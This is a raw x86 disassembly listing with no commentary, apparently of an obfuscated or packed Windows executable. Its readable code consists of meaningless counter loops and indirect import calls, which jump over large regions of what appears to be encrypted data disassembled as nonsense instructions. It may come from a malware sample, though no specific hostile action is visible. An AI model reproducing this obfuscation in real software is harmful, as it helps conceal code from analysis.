  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0xc68bf00b
  4095d3:	shr    DWORD PTR [ecx+ebx*8+0x7e],cl
  4095d7:	jle    0x409653
  4095d9:	jge    0x409659
  4095db:	jle    0x409618
  4095dd:	jge    0x409649
  4095df:	ror    DWORD PTR [ecx],cl
  4095e1:	out    dx,eax
  4095e2:	loop   0x409632
  4095e4:	cmp    esi,DWORD PTR [ecx]
  4095e6:	fist   DWORD PTR [edi+esi*1]
  4095e9:	lahf   
  4095ea:	mul    DWORD PTR [ebp+0x44]
  4095ed:	pop    esi
  4095ee:	mov    al,ds:0xe6bca825
  4095f3:	int3   
  4095f4:	jnp    0x409609
  4095f6:	clc    
  4095f7:	mov    DWORD PTR [edx],esp
  4095f9:	xor    DWORD PTR [eax],ecx
  4095fb:	rcr    BYTE PTR [ebx+0x4],cl
  4095fe:	pusha  
  4095ff:	and    edi,DWORD PTR [ecx+edx*2]
  409602:	cmp    ecx,DWORD PTR [edi]
  409604:	rol    dl,cl
  409606:	pop    ss
  409607:	mov    eax,0x999172a
  40960c:	pop    esp
  40960d:	rcl    eax,0xa6
  409610:	add    eax,0x147c5b8a
  409615:	mov    ebx,edx
  409617:	pop    edi
  409618:	adc    al,0x8c
  40961a:	mov    edi,0xc945573d
  40961f:	ficom  WORD PTR [esp+edi*8-0x5d]
  409623:	mov    al,ds:0xb95fd2bf
  409628:	sbb    esp,DWORD PTR [edx+0xf]
  40962b:	xor    DWORD PTR [eax+0x52],0xfffffff9
  40962f:	mov    esp,0xc98604ce
  409634:	mov    eax,0x90e2a3d9
  409639:	mov    DWORD PTR [edx],ebp
  40963b:	or     dh,ch
  40963d:	stos   DWORD PTR es:[edi],eax
  40963e:	push   0x26a00bf8
  409643:	push   ss
  409644:	adc    ch,bl
  409646:	mov    ecx,0xa55f4c9a
  40964b:	je     0x4096b2
  40964d:	xor    DWORD PTR ds:0x56e19d93,esi
  409653:	jbe    0x40966c
  409655:	mov    edi,DWORD PTR [edx-0x21]
  409658:	popf   
  409659:	std    
  40965a:	retf   0xe80e
  40965d:	aaa    
  40965e:	(bad)  
  40965f:	sbb    DWORD PTR [ecx-0x59],esp
  409662:	leave  
  409663:	jmp    0x409685
  409665:	xor    DWORD PTR [ebp-0x4e8822b2],0xf3de70e0
  40966f:	xlat   BYTE PTR ds:[ebx]
  409670:	shl    ebp,1
  409672:	mov    ebx,0x47a878eb
  409677:	mov    edx,edx
  409679:	mov    DWORD PTR [esp+eax*8+0x7c],esi
  40967d:	or     esp,esp
  40967f:	cmp    eax,eax
  409681:	mov    eax,ds:0x44a7328c
  409686:	idiv   DWORD PTR [ecx+0x58]
  409689:	sub    dl,dl
  40968b:	and    ecx,DWORD PTR [esp-0x3a]
  40968f:	cdq    
  409690:	ja     0x409708
  409692:	jmp    0x3ba0c8a9
  409697:	inc    ecx
  409698:	int3   
  409699:	mov    ds:0x647012bd,eax
  40969e:	loope  0x409623
  4096a0:	jmp    0x409671
  4096a2:	mov    dh,0xe3
  4096a4:	cmp    edx,DWORD PTR [eax]
  4096a6:	cwde   
  4096a7:	ret    0x5d28
  4096aa:	les    edi,FWORD PTR [edi+edi*8]
  4096ad:	pop    esp
  4096ae:	frstor [esi-0x28e3feab]
  4096b4:	mov    WORD PTR [ebp+0x148fd96a],gs
  4096ba:	popf   
  4096bb:	es cmp ebx,ebx
  4096be:	inc    esp
  4096bf:	lock into 
  4096c1:	dec    esi
  4096c2:	jo     0x4096ee
  4096c4:	mov    eax,ds:0x969582bf
  4096c9:	and    BYTE PTR [eax+0x30],bl
  4096cc:	mov    DWORD PTR [esi],esi
  4096ce:	loop   0x409700
  4096d0:	or     DWORD PTR [ebx-0x15],ecx
  4096d3:	push   es
  4096d4:	jg     0x40968c
  4096d6:	in     eax,dx
  4096d7:	adc    esp,ebx
  4096d9:	cs pop edi
  4096db:	lea    eax,[edi+ebx*1-0x56]
  4096df:	fsub   QWORD PTR [edi-0x47887980]
  4096e5:	xchg   ebx,eax
  4096e6:	cdq    
  4096e7:	xor    DWORD PTR [ecx],esp
  4096e9:	or     eax,0x808b1bd7
  4096ee:	inc    edi
  4096ef:	push   esi
  4096f0:	jno    0x4096b4
  4096f2:	fwait
  4096f3:	cmp    al,0x3d
  4096f5:	adc    DWORD PTR [edx+eax*2+0x7dd0c5fb],ebx
  4096fc:	popf   
  4096fd:	sti    
  4096fe:	(bad)  
  4096ff:	stos   DWORD PTR es:[edi],eax
  409700:	mov    dl,0x5f
  409702:	outs   dx,DWORD PTR ds:[esi]
  409703:	xchg   edx,edi
  409705:	push   esi
  409706:	sti    
  409707:	mov    al,0x2e
  409709:	or     eax,0xdd1ac6e1
  40970e:	mov    cl,0xd3
  409710:	fimul  DWORD PTR [edi]
  409712:	mov    dl,0x42
  409714:	mov    gs,edx
  409716:	mov    cl,BYTE PTR [eax]
  409718:	xor    edi,DWORD PTR [eax]
  40971a:	stc    
  40971b:	add    bh,BYTE PTR [edi+eiz*8-0x1d7521a8]
  409722:	jo     0x4096f0
  409724:	call   0xf669:0xa00e181e
  40972b:	test   al,0x4a
  40972d:	(bad)  
  40972e:	std    
  40972f:	sub    BYTE PTR [ecx-0x35],al
  409732:	popa   
  409733:	in     eax,0xcc
  409735:	pop    ebx
  409736:	inc    ebx
  409737:	sbb    DWORD PTR [edi+ecx*4-0x5ccd1166],0xffffffed
  40973f:	and    BYTE PTR [ecx-0x2a61a079],bl
  409745:	xor    eax,ebp
  409747:	jle    0x4097be
  409749:	lods   eax,DWORD PTR ds:[esi]
  40974a:	daa    
  40974b:	clc    
  40974c:	inc    ebx
  40974d:	imul   esp,DWORD PTR [esi-0x56210918],0xfffffffd
  409754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409755:	cmc    
  409756:	out    dx,eax
  409757:	push   ebp
  409758:	pop    es
  409759:	push   esp
  40975a:	jge    0x409707
  40975c:	scas   eax,DWORD PTR es:[edi]
  40975d:	clc    
  40975e:	xor    DWORD PTR [eax],esp
  409760:	dec    edi
  409761:	or     edx,DWORD PTR ds:0xb2fc0123
  409767:	jne    0x4097c1
  409769:	xchg   DWORD PTR [eax],edx
  40976b:	fidivr DWORD PTR ds:0xbb9fb803
  409771:	fdivr  DWORD PTR [edi]
  409773:	stos   BYTE PTR es:[edi],al
  409774:	sub    ch,BYTE PTR [eax-0x57270dbd]
  40977a:	inc    ebp
  40977b:	mov    BYTE PTR [esi],dl
  40977d:	xor    al,0xfb
  40977f:	jg     0x4097b9
  409781:	and    esi,esi
  409783:	xor    ch,BYTE PTR [ebp+ebx*8+0x5b]
  409787:	fcmovne st,st(1)
  409789:	dec    ecx
  40978a:	pusha  
  40978b:	inc    ebx
  40978c:	stos   DWORD PTR es:[edi],eax
  40978d:	add    esp,ecx
  40978f:	in     eax,0x79
  409791:	data16 fld st(4)
  409794:	mov    DWORD PTR ds:0xf2ec2844,edx
  40979a:	jl     0x409742
  40979c:	sbb    eax,0x61632ce3
  4097a1:	jnp    0x40972c
  4097a3:	mov    eax,ds:0x53791418
  4097a8:	jns    0x409802
  4097aa:	inc    esi
  4097ab:	push   ebp
  4097ac:	xchg   DWORD PTR [eax],esi
  4097ae:	push   ecx
  4097af:	les    ebx,FWORD PTR [edi-0x38]
  4097b2:	test   BYTE PTR [edx+0x45b8b6ed],ch
  4097b8:	ins    DWORD PTR es:[edi],dx
  4097b9:	xor    al,0x19
  4097bb:	scas   al,BYTE PTR es:[edi]
  4097bc:	fist   DWORD PTR [edi-0x75]
  4097bf:	mov    ebp,0x61a0558f
  4097c4:	lods   eax,DWORD PTR ds:[esi]
  4097c5:	sub    ebp,DWORD PTR ds:0x5751c4fe
  4097cb:	or     dl,BYTE PTR ds:0xf7a9f550
  4097d1:	addr16 add bh,bl
  4097d4:	loope  0x4097bc
  4097d6:	cld    
  4097d7:	or     al,0x75
  4097d9:	(bad)  
  4097da:	fcomp  QWORD PTR cs:[ebx-0x39]
  4097de:	aas    
  4097df:	mov    cs,ebx
  4097e1:	ficomp WORD PTR [eax-0x189269b4]
  4097e7:	mov    ebx,0xff839827
  4097ec:	fnsave [edx+0x6a]
  4097ef:	call   0x5587:0xd0627171
  4097f6:	push   cs
  4097f7:	je     0x4097e4
  4097f9:	hlt    
  4097fa:	mov    ebx,0xd59f0df3
  4097ff:	neg    BYTE PTR ds:0x874319c7
  409805:	mov    al,ds:0x61c4e45c
  40980a:	pushf  
  40980b:	pop    esp
  40980c:	push   eax
  40980d:	(bad)  
  40980e:	lea    edi,[eax+0x54]
  409811:	sub    BYTE PTR [eax-0x50],dl
  409814:	xor    DWORD PTR [esi],0x64
  409817:	mov    ds:0x6b141a62,al
  40981c:	adc    edi,DWORD PTR [ecx]
  40981e:	pop    ds
  40981f:	xchg   ebp,eax
  409820:	int3   
  409821:	cwde   
  409822:	sbb    eax,0x70e98dc2
  409827:	cmp    BYTE PTR [edi+ebx*1],0xe9
  40982b:	dec    esp
  40982c:	cmp    DWORD PTR [eax-0x72],0xeabcefde
  409833:	scas   al,BYTE PTR es:[edi]
  409834:	add    DWORD PTR ds:0xdc31cdb6,ebx
  40983a:	int3   
  40983b:	adc    dl,BYTE PTR [ebx+0x403ff1c0]
  409841:	fdivrp st(6),st
  409843:	inc    ebx
  409844:	adc    esi,edi
  409846:	fistp  WORD PTR [ebx-0x51]
  409849:	hlt    
  40984a:	mov    ch,0x7b
  40984c:	xor    DWORD PTR [ebp+0x10f27d14],edi
  409852:	jbe    0x4097da
  409854:	shl    ch,cl
  409856:	aas    
  409857:	cs mov dl,0x3f
  40985a:	loope  0x409811
  40985c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40985d:	repz imul eax,ebx,0x9d3f4cac
  409864:	mov    WORD PTR [edx-0x4c],fs
  409867:	lock pop edx
  409869:	pop    edx
  40986a:	loopne 0x40983f
  40986c:	rcr    edx,cl
  40986e:	daa    
  40986f:	push   ebp
  409870:	jae    0x4098b8
  409872:	retf   0xa650
  409875:	xor    DWORD PTR [edx+0x24681a62],edi
  40987b:	mov    eax,0xa64884c6
  409880:	mov    esp,0xd8d2e51e
  409885:	mov    ds:0xc364a1ee,al
  40988a:	xor    DWORD PTR [edi+0x7a],edx
  40988d:	aam    0x97
  40988f:	and    BYTE PTR [esi+0x2786f9e9],bl
  409895:	xchg   ebp,eax
  409896:	inc    ecx
  409897:	mov    ch,BYTE PTR [edx-0x633aa37c]
  40989d:	sbb    ch,dh
  40989f:	mov    eax,ds:0xb181961a
  4098a4:	cmp    DWORD PTR [eax],eax
  4098a6:	jl     0x409882
  4098a8:	fwait
  4098a9:	cs aad 0x58
  4098ac:	cmp    esp,DWORD PTR ds:0x1e5a3073
  4098b2:	mov    ecx,0x245d80a1
  4098b7:	jbe    0x409860
  4098b9:	add    al,0xc6
  4098bb:	fbld   TBYTE PTR [ebp+0x55]
  4098be:	fstp   TBYTE PTR [ecx]
  4098c0:	stc    
  4098c1:	add    DWORD PTR [ebx+0x14],ecx
  4098c4:	cmovno edx,DWORD PTR [ecx+0x2f0f1681]
  4098cb:	mov    BYTE PTR [edx-0x3902ec4],bl
  4098d1:	sti    
  4098d2:	sub    eax,0xec1aa225
  4098d7:	or     esi,DWORD PTR [edi]
  4098d9:	jo     0x40994f
  4098db:	stc    
  4098dc:	jns    0x409932
  4098de:	xor    bh,BYTE PTR [eax-0x7e3648f1]
  4098e4:	sbb    eax,0x43383b
  4098e9:	and    ebx,DWORD PTR [edx+0x0]
  4098ec:	add    BYTE PTR [ebx],al
  4098ee:	or     BYTE PTR [ecx],dl
  4098f0:	sbb    eax,0x4337a7
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fst    st(4)
  4099be:	xchg   edi,eax
  4099bf:	sub    ebp,DWORD PTR [ebp+0x68]
  4099c2:	in     al,0x7e
  4099c4:	jle    0x409a40
  4099c6:	jge    0x409a46
  4099c8:	jle    0x4099d9
  4099ca:	mov    ebp,0x4c7a9dee
  4099cf:	mov    dl,0xf0
  4099d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d2:	mov    cl,0x9f
  4099d4:	mov    edi,0xc688ae2a
  4099d9:	fild   WORD PTR [ebp-0x46]
  4099dd:	sti    
  4099de:	out    0xce,al
  4099e0:	pop    ss
  4099e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099e2:	jmp    0xac3:0xddfbcfb2
  4099e9:	call   0x527c:0x8c0b9c79
  4099f0:	stc    
  4099f1:	mov    ds:0xd47b615e,al
  4099f6:	mov    cl,0x71
  4099f8:	xchg   esi,eax
  4099f9:	push   es
  4099fa:	push   ebp
  4099fb:	cmp    esi,DWORD PTR [edx]
  4099fd:	mov    al,ds:0x2623836e
  409a02:	rcr    ah,0x46
  409a05:	and    BYTE PTR [ecx-0x1e],ch
  409a08:	test   DWORD PTR [ebx-0x51ccdaaf],edi
  409a0e:	stc    
  409a0f:	xchg   ebp,eax
  409a10:	inc    esp
  409a11:	ins    BYTE PTR es:[edi],dx
  409a12:	pusha  
  409a13:	sbb    ah,dl
  409a15:	xor    eax,0x35b8eda4
  409a1a:	int    0x57
  409a1c:	dec    ecx
  409a1d:	or     DWORD PTR [edi-0x4af9779b],edi
  409a23:	mov    eax,0xb2ad5d18
  409a28:	and    bh,BYTE PTR [ebx]
  409a2a:	push   es
  409a2b:	pop    eax
  409a2c:	addr16 retf 
  409a2e:	pop    es
  409a2f:	sbb    BYTE PTR [eax],ch
  409a31:	push   es
  409a32:	sub    al,0xad
  409a34:	aas    
  409a35:	int    0x6e
  409a37:	jecxz  0x409a1c
  409a39:	mov    edx,0x56ad238c
  409a3e:	or     eax,0xb01ccd7e
  409a43:	sbb    dl,BYTE PTR [edx+0x72175ef3]
  409a49:	out    0xf7,al
  409a4b:	cmp    DWORD PTR [edx],ebp
  409a4d:	push   eax
  409a4e:	mov    edi,0xaea0c6e1
  409a53:	add    al,0x7d
  409a55:	dec    ebx
  409a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a57:	cmp    BYTE PTR [edx+0x76],bl
  409a5a:	icebp  
  409a5b:	jmp    0x8d62:0x32b5da28
  409a62:	int3   
  409a63:	pop    edx
  409a64:	push   ebp
  409a65:	outs   dx,DWORD PTR ds:[esi]
  409a66:	sbb    BYTE PTR [edi+0x56],0x37
  409a6a:	add    edi,ebp
  409a6c:	fmul   st,st(2)
  409a6e:	loopne 0x409a06
  409a70:	sbb    al,0x63
  409a72:	popa   
  409a73:	mov    eax,0x9a7cb1e5
  409a78:	sub    cl,dl
  409a7a:	pop    ebp
  409a7b:	hlt    
  409a7c:	xor    BYTE PTR [ebx-0x1f],bh
  409a7f:	jecxz  0x409ae2
  409a81:	mov    bh,0x13
  409a83:	push   eax
  409a84:	xchg   ecx,eax
  409a85:	mov    ds:0xee8f29f5,al
  409a8a:	add    al,0x8f
  409a8c:	call   0x388e:0x2e6ecfc3
  409a93:	dec    esi
  409a94:	lea    ebp,[edi+eax*4+0x68]
  409a98:	inc    esp
  409a99:	mov    dl,0x7
  409a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a9c:	and    esi,DWORD PTR ds:0xb534992f
  409aa2:	lea    edx,[edi+edi*2+0x71]
  409aa6:	mov    dl,0xcd
  409aa8:	shr    BYTE PTR [eax-0x6b],1
  409aab:	std    
  409aac:	call   0xc0b4:0x4ee48536
  409ab3:	in     al,dx
  409ab4:	test   BYTE PTR [edi],cl
  409ab6:	jge    0x409a9a
  409ab8:	mov    bh,0x82
  409aba:	neg    DWORD PTR [edx+eax*2+0x36]
  409abe:	fs test al,0x55
  409ac1:	iret   
  409ac2:	lods   al,BYTE PTR ds:[esi]
  409ac3:	pop    esp
  409ac4:	retf   
  409ac5:	pop    es
  409ac6:	cmp    al,0x93
  409ac8:	outs   dx,BYTE PTR ds:[esi]
  409ac9:	sbb    ch,bh
  409acb:	fild   DWORD PTR [edx-0x46]
  409ace:	xchg   edi,eax
  409acf:	jbe    0x409ac5
  409ad1:	add    edx,DWORD PTR [esi+0x7]
  409ad4:	lock (bad) 
  409ad6:	enter  0x6f54,0x40
  409ada:	pop    esi
  409adb:	(bad)  
  409adc:	cmp    eax,ebp
  409ade:	fbstp  TBYTE PTR [ecx]
  409ae0:	pop    ss
  409ae1:	ds mov esp,0xea11e9f7
  409ae7:	or     ebp,DWORD PTR [edi-0x58]
  409aea:	push   0x31
  409aec:	mov    ebx,0xf7399d99
  409af1:	xor    DWORD PTR [ecx],ebx
  409af3:	pop    es
  409af4:	mov    gs,WORD PTR [esi-0x1d]
  409af7:	and    DWORD PTR ds:0x6bdc9155,edx
  409afd:	sbb    BYTE PTR [ebp+0x21],bh
  409b00:	xor    esi,DWORD PTR ds:0x791755a1
  409b06:	jbe    0x409aae
  409b08:	adc    ebp,ebx
  409b0a:	outs   dx,DWORD PTR ds:[esi]
  409b0b:	out    0x50,al
  409b0d:	push   eax
  409b0e:	xchg   esp,eax
  409b0f:	push   eax
  409b10:	dec    edi
  409b11:	adc    BYTE PTR [ecx-0x71],ch
  409b14:	fdivr  DWORD PTR [eax+eiz*4-0x590ba7c8]
  409b1b:	sub    bl,dh
  409b1d:	adc    al,0x5e
  409b1f:	pop    ebx
  409b20:	jbe    0x409b02
  409b22:	and    DWORD PTR [eax+0x302d239e],0xffa5f7f7
  409b2c:	xor    DWORD PTR [esi+0x65],0xdb994f03
  409b33:	aad    0x62
  409b35:	xor    BYTE PTR [edi-0x4bf21802],0x2a
  409b3c:	pop    ss
  409b3d:	loope  0x409b9e
  409b3f:	dec    BYTE PTR [ecx+0x25]
  409b42:	data16 fdiv QWORD PTR [ecx+0x626cd61e]
  409b49:	sar    DWORD PTR [eax],0xf7
  409b4c:	jl     0x409b9f
  409b4e:	shl    BYTE PTR [edx+0x1c],1
  409b51:	push   0x33
  409b53:	or     DWORD PTR [edx-0x1c48cdb0],ebp
  409b59:	jb     0x409ae0
  409b5b:	stc    
  409b5c:	jnp    0x409b7b
  409b5e:	loope  0x409bd2
  409b60:	pop    ss
  409b61:	repnz daa 
  409b63:	js     0x409b47
  409b65:	sbb    al,0x66
  409b67:	sub    BYTE PTR [ebx],dh
  409b69:	push   eax
  409b6a:	(bad)  
  409b6b:	stos   BYTE PTR es:[edi],al
  409b6c:	and    eax,0x6f4f5b78
  409b71:	cdq    
  409b72:	in     eax,0xa1
  409b74:	push   cs
  409b75:	sub    ah,BYTE PTR ds:[esi-0x71]
  409b79:	lea    ebx,[eax]
  409b7b:	xchg   ebp,eax
  409b7c:	inc    ebp
  409b7d:	aam    0x87
  409b7f:	pop    edx
  409b80:	sbb    edi,DWORD PTR [ebx+0x736194b2]
  409b86:	mov    BYTE PTR [edi-0x17],ah
  409b89:	fist   WORD PTR [ebx]
  409b8b:	pop    ebp
  409b8c:	dec    ebx
  409b8d:	inc    edx
  409b8e:	jo     0x409c02
  409b90:	pop    ds
  409b91:	scas   al,BYTE PTR es:[edi]
  409b92:	push   esp
  409b93:	popf   
  409b94:	repz repnz cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409b98:	aam    0x7b
  409b9a:	jns    0x409b9f
  409b9c:	xchg   edx,eax
  409b9d:	cmc    
  409b9e:	mov    esi,ds
  409ba0:	lods   eax,DWORD PTR ds:[esi]
  409ba1:	push   edx
  409ba2:	in     al,0x49
  409ba4:	mov    dl,0xd9
  409ba6:	imul   edi,DWORD PTR [ebx+0x30],0x9481d830
  409bad:	mov    ebp,DWORD PTR [ecx-0x458373b9]
  409bb3:	inc    esp
  409bb4:	cli    
  409bb5:	cmp    ecx,DWORD PTR [edx+edi*4]
  409bb8:	mov    ecx,0xe41f8314
  409bbd:	sti    
  409bbe:	xchg   ecx,eax
  409bbf:	cwde   
  409bc0:	jno    0x409b92
  409bc2:	scas   al,BYTE PTR es:[edi]
  409bc3:	nop
  409bc4:	adc    DWORD PTR [eax+0x2d],0xffffff92
  409bc8:	push   es
  409bc9:	(bad)  
  409bca:	mov    ds:0xdb916ef0,al
  409bcf:	and    eax,0x1a87a955
  409bd4:	pusha  
  409bd5:	lods   al,BYTE PTR ds:[esi]
  409bd6:	adc    BYTE PTR [eax-0x6155aa05],bh
  409bdc:	es out dx,eax
  409bde:	call   0x72b6:0x883f7a5b
  409be5:	pop    ecx
  409be6:	(bad)  
  409be7:	dec    edi
  409be8:	cmp    DWORD PTR [ebp+0x43377a32],esp
  409bee:	mov    eax,ds:0xa1c41193
  409bf3:	in     eax,0x96
  409bf5:	(bad)  
  409bf8:	sub    dl,BYTE PTR [esi-0x3a]
  409bfb:	add    DWORD PTR [eax+eax*1-0x118275bb],esp
  409c02:	mov    eax,ds:0xddd9c7b9
  409c07:	ror    DWORD PTR [edi+0x32ff2fe0],1
  409c0d:	gs pop ebp
  409c0f:	test   al,0x8a
  409c11:	and    BYTE PTR [edx-0x21],ah
  409c14:	push   eax
  409c15:	push   ds
  409c16:	int    0x34
  409c18:	cmp    al,0x96
  409c1a:	push   esp
  409c1b:	repnz push ds
  409c1d:	and    al,0xa1
  409c1f:	xor    al,0xa7
  409c21:	mov    ds:0x502bb9b3,eax
  409c26:	movnti DWORD PTR [eax+0x342ad81c],ebp
  409c2d:	call   0x2b88:0x13b0c69
  409c34:	shl    dl,0x81
  409c37:	jp     0x409c3c
  409c39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c3a:	push   ss
  409c3b:	mov    cl,0x3b
  409c3d:	cmp    al,0x7b
  409c3f:	daa    
  409c40:	fimul  DWORD PTR [ecx-0x2f4fb71b]
  409c46:	mov    BYTE PTR [esp+ebp*4+0x53bc6356],ah
  409c4d:	inc    ebp
  409c4e:	xor    eax,0xb0652d57
  409c53:	add    al,0x8b
  409c55:	mov    BYTE PTR [eax+0x4629a5ec],dl
  409c5b:	push   cs
  409c5c:	push   edi
  409c5d:	repz in al,0xb5
  409c60:	push   es
  409c61:	mov    eax,ds:0x1e050adf
  409c66:	aam    0x4f
  409c68:	das    
  409c69:	fnstcw WORD PTR [edi]
  409c6b:	push   ecx
  409c6c:	jmp    0x409c87
  409c6e:	and    BYTE PTR [edi+esi*4],bh
  409c71:	cdq    
  409c72:	cs popf 
  409c74:	sub    esp,DWORD PTR [edx+0x41760882]
  409c7a:	imul   eax,DWORD PTR [ebx-0x6774b12b],0x13d566ce
  409c84:	mov    edi,0xe201f99b
  409c89:	(bad)  
  409c8a:	bound  ebx,QWORD PTR [ebp-0x15579515]
  409c90:	push   0x7d
  409c92:	mov    fs,WORD PTR [ebp-0x61bca616]
  409c98:	mov    ecx,0x6b2ab12d
  409c9d:	jo     0x409c34
  409c9f:	(bad)
  409ca2:	cmp    eax,0xed42aca3
  409ca7:	jno    0x409c94
  409ca9:	lahf   
  409caa:	sub    DWORD PTR [edx],esi
  409cac:	adc    edi,DWORD PTR [eax-0x25]
  409caf:	ret    
  409cb0:	cmp    al,0x9e
  409cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb3:	dec    esp
  409cb4:	cmp    eax,0x661b747c
  409cb9:	imul   esi,DWORD PTR [ebp+0x1e],0x4e421f90
  409cc0:	js     0x409d18
  409cc2:	mov    dh,0xda
  409cc4:	sub    cl,BYTE PTR [edx]
  409cc6:	add    BYTE PTR [esi],dl
  409cc8:	out    dx,eax
  409cc9:	sub    eax,0xf249d24
  409cce:	test   esi,eax
  409cd0:	push   es
  409cd1:	add    BYTE PTR [eax],al
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	mov    ebp,ebx
  409cfb:	xlat   BYTE PTR ds:[ebx]
  409cfc:	inc    edi
  409cfd:	je     0x409ce2
  409cff:	jle    0x409d7f
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	add    BYTE PTR [esi],al
  409d07:	mov    ch,0xeb
  409d09:	out    dx,al
  409d0a:	aas    
  409d0b:	js     0x409cd1
  409d0d:	(bad)  
  409d0e:	jnp    0x409cb0
  409d10:	mov    DWORD PTR [ecx-0x7c],0xe84a271d
  409d17:	and    dh,BYTE PTR [ebx+0x52]
  409d1a:	imul   esi,eax,0x1b
  409d1d:	sub    edx,DWORD PTR [edi+0x18]
  409d20:	dec    ebx
  409d21:	jo     0x409d73
  409d23:	inc    edx
  409d24:	(bad)  
  409d25:	mul    DWORD PTR [esi+ebp*8]
  409d28:	clc    
  409d29:	out    dx,al
  409d2a:	pop    es
  409d2b:	test   dh,bh
  409d2d:	ja     0x409cf5
  409d2f:	pop    edx
  409d30:	call   0x258c625b
  409d35:	data16 cli 
  409d37:	enter  0xdfbe,0x31
  409d3b:	mov    bh,0x8c
  409d3d:	in     eax,dx
  409d3e:	xchg   edi,eax
  409d3f:	fist   DWORD PTR [ebp+0x65ec545d]
  409d45:	gs inc edi
  409d47:	call   0x60c8caac
  409d4c:	shl    BYTE PTR [edi+0x21301691],cl
  409d52:	ret    0xd3a
  409d55:	xchg   ebp,eax
  409d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d57:	mov    ds:0x1be28168,al
  409d5c:	pop    ss
  409d5d:	lea    ebx,[edi+0x39dba471]
  409d63:	dec    edx
  409d64:	dec    ecx
  409d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d66:	in     al,0x90
